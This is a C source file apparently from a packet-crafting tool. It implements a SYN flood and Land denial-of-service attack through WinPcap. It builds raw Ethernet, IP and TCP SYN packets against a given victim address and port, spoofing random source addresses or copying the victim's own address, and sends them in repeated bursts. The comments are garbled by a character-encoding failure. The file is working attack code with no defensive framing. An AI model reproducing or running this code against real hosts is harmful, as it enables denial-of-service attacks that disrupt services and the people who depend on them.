#define WPCAP
#define HAVE_REMOTE

#include <pcap.h>

#include "../headers/types.h"
#include "../headers/ethernet.h"
#include "../headers/ip.h"
#include "../headers/icmp.h"
#include "../headers/tcp.h"

extern pcap_t* select_device();
extern DWORD random_ip_address();
extern WORD checksum(WORD *buffer, DWORD size);

/******************************************************************************/
//  �������, �������������� ����� SYN Flood � Land.
//
//  ������� ���������:
//      char *victim_ip_address - IP ������ ������.
//      WORD victim_port - ���� ������.
//      DWORD iteration - ���������� ����������.
//      DWORD interval - �������� ��� ������� ������.
//      WORD burst - ���������� ���������� ��������.
//      bool land - ���� Land �����.
//              true - Land �����.
//              false - SYN Flood �����.
//  �������� ���������:
//      int - ������������ ��������.
//          '0' - ��� � �������.
//          '-1' - �������� ��������� ������.
/******************************************************************************/
int syn_flood(char *victim_ip_address, WORD victim_port, DWORD iteration, DWORD interval, WORD burst, bool land)
{
    int i = 0;          // �������.

    struct ethernet_header ethernet;    // Ethernet ���������.
    struct ip_header ip;                // IP ���������.
    struct tcp_header tcp;              // TCP ���������.
    struct tcp_pseudoheader tcp_pseudo; // ��������������� TCP.

    pcap_t *device_handle;                      // �������� ���������� ��� ������/�������� ������.

    char data[ETHERNET_DATA_LENGTH] = {0};      // ������������ ������.
    char packet[65536] = {0};                   // ������������ �����.
    char temp_buffer[65535] = {0};              // ��������� ������.

    memset(data, rand(), ETHERNET_DATA_LENGTH);
    device_handle = select_device();
    // ���������� Ethernet ���������.
    ethernet.source_mac_address[0] = 0x00;
    ethernet.source_mac_address[1] = 0x00;
    ethernet.source_mac_address[2] = 0x00;
    ethernet.source_mac_address[3] = 0x00;
    ethernet.source_mac_address[4] = 0x00;
    ethernet.source_mac_address[5] = 0x00;
    ethernet.destination_mac_address[0] = 0xff;
    ethernet.destination_mac_address[1] = 0xff;
    ethernet.destination_mac_address[2] = 0xff;
    ethernet.destination_mac_address[3] = 0xff;
    ethernet.destination_mac_address[4] = 0xff;
    ethernet.destination_mac_address[5] = 0xff;
    ethernet.type = htons(ETHERNET_TYPE_IP);
    // ������������ ������.
    memcpy(packet, &ethernet, sizeof(ethernet_header));
    // ��������� IP ���������.
    ip.version = 4;                                             // ������ ��������� IPv4.
    ip.header_length = 5;                                       // ������ IP ���������.
    ip.type_of_service = 0;                                     // ��� ������������.
    ip.total_length = htons(sizeof(ip_header) +
                            sizeof(tcp_header) +
                            sizeof(data));                      // ������ = IP ��������� + TCP ��������� + ������.
    ip.identification = 0;                                      // �������������.
    ip.flags_fragmentation_offset = 0;                          // ����� ������������ � ��������.
    ip.time_to_live = 255;                                      // ��������� ���������� ���������� ���������������.
    ip.protocol = IPPROTO_TCP;                                  // �������� ���������� ������.
    ip.destination_ip_address = inet_addr(victim_ip_address);   // IP ����� ����������.
    // ���������� ��������������� TCP.
    tcp_pseudo.destination_ip_address = ip.destination_ip_address;      // IP ����� ����������.
    tcp_pseudo.placeholder = 0;                                         // �����������.
    tcp_pseudo.protocol = IPPROTO_TCP;                                  // ��������.
    tcp_pseudo.length = htons(sizeof(tcp_header) + sizeof(data));       // ������ TCP ��������� � �������.
    // ���������� TCP ���������.
    tcp.destination_port = htons(victim_port);          // ���� ����������.
    tcp.acknowledgement_number = 0;                     // ����� �������������.
    tcp.header_length = 0x05;                           // ������ ���������.
    tcp.flags = TCP_FLAG_SYN;                           // �����.
    tcp.urgent_pointer = 0;                             // ��������� ���������.

    while (burst--)
    {
        printf(".");
        for (i = (int)(iteration); i > 0; i--)
        {
            // ��������� ������������ ������ IP ���������.
            ip.header_checksum = 0;                     // ����������� ����� IP ���������.
            // Land �����.
            if (land)
                ip.source_ip_address = ip.destination_ip_address;   // IP ����� �����������.
            else
                ip.source_ip_address = random_ip_address(); // IP ����� �����������.
            // ���������� ����������� ����� IP ���������.
            ip.header_checksum = checksum((WORD*)&ip, sizeof(ip_header));
            // ������������ ������.
            memcpy((packet + sizeof(ethernet_header)), &ip, sizeof(ip_header));
            // ���������� ������������ ������ ��������������� TCP.
            tcp_pseudo.source_ip_address = ip.source_ip_address;    // IP ����� �����������.
            // ��������� ��������� ����� ���������������� TCP ��������.
            memcpy(temp_buffer, &tcp_pseudo, sizeof(tcp_pseudoheader));
            // ���������� ������������ ������ TCP ���������.
            // Land �����.
            if (land)
                tcp.source_port = tcp.destination_port; // ���� �����������.
            else
                tcp.source_port = htons((rand() % 0xffff) + 1);      // ���� �����������.
            tcp.sequence_number = htonl(rand() % 0xffffffff);   // ����� ������������������.
            tcp.window_size = htons((rand() % 0xffff) + 1);     // ������ ����.
            tcp.checksum = 0;                                   // ����������� ����.
            // ��������� �� ��������� ����� TCP ���������.
            memcpy((temp_buffer + sizeof(tcp_pseudoheader)), &tcp, sizeof(tcp_header));
            // ��������� �� ��������� ����� ������.
            memcpy((temp_buffer + sizeof(tcp_pseudoheader) + sizeof(tcp_header)), &data, sizeof(data));
            // ��������� ����������� ����� TCP ���������.
            tcp.checksum = checksum((WORD*)&temp_buffer, (sizeof(tcp_pseudoheader) + sizeof(tcp_header) + sizeof(data)));
            // ������������ ������.
            memcpy((packet + sizeof(ethernet_header) + sizeof(ip_header)), &tcp, sizeof(tcp_header));
            memcpy((packet + sizeof(ethernet_header) + sizeof(ip_header) + sizeof(tcp_header)), &data, sizeof(data));
            // ���������� ����� � ����.
            if (pcap_sendpacket(device_handle,
                                (u_char*)packet,
                                (sizeof(ethernet_header) + sizeof(ip_header) + sizeof(tcp_header) + sizeof(data))) != 0)
            {
                fprintf(stderr, "\nError sending the packet: %s\n", pcap_geterr(device_handle));
                return -1;
            }
            if (interval)
                Sleep(interval);
        }
    }

    return 0;
}
